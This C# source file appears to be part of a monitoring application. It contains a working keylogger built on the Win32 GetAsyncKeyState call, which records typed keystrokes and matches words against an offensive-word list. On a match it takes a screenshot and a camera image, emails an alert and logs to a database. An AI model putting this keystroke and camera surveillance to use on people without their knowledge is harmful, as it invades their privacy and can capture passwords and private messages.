using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ClientSide
{
    class MonitorTyping : Monitor
    {

        string input = "";
        public bool ifLive;
        public MonitorTyping() { }
        public override void playThreadMonitor()
        {
            if (base.monitorAlive)
            {
                stopThreadMonitor();
            }
            base.monitorAlive = true;
            base.monitorThread = new Thread(playTypingMonitor);
            base.monitorThread.Start();

        }
        public override void stopThreadMonitor()
        {
            base.monitorAlive = false;
        }

        // keylogger from API
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
    

        public void playTypingMonitor()
        {
            List<string> offensiveWords = base.SettingInstance.getWord();
            input = "";

            while (base.monitorAlive)
            {
                Thread.Sleep(5);
                for (int i = 32; i < 127; i++) 
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 32769)
                    {
                        input += (char)i;

                        if (i == 32) // if type space 
                        {
                            //ShowErrorDialog(input+", "+ifLive);atata atara atara 
                            if (ifLive)
                            {
                                wordFromKeylogger handler = Program.updateCurrentKeylogger;
                                handler(input);
                            }


                            //ShowErrorDialog(input); atara atara atara a a
                            string replacement = input.Replace(" ", "");
                            //ShowErrorDialog(replacement);
                            foreach (string badWord in offensiveWords)
                            {

                                string xb = badWord.Replace(" ", "");
                                if (replacement.ToLower().Equals(badWord) && xb.Length > 0)
                                {
                                    reportOrSendAlert(badWord);
                                }   // atara 
                            }
                            input = "";
                        }


                    }
                }
            }
        }

        private void reportOrSendAlert(string badWord)
        {
            if (base.SettingInstance.triggersForAlert.Contains("badWord") == true)
            {
                string FilePic = ScreenCapture();
                CaptureCamera(FilePic);
                sendAlertToMail(FilePic, "badWord trigger occur", badWord, "typing");
                ShowErrorDialog("send alert to mail\nTypedin trigger occur\nword: |" + badWord + "|");

            }

            if (base.SettingInstance.triggersForReport.Contains("badWord") == true)
            {
                base.DBInstance.connectToDatabase();
                base.DBInstance.fillTriggersTable(1, DateTime.Now.ToString(), "\"" + badWord + "\"");
                ShowErrorDialog("update DB\nTypedin trigger occur\nword: |" + badWord + "|");
            }
        }//atara atara 

       
        private static void ShowErrorDialog(string message)
        {
            MessageBox.Show(message, Application.ProductName, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }
}
 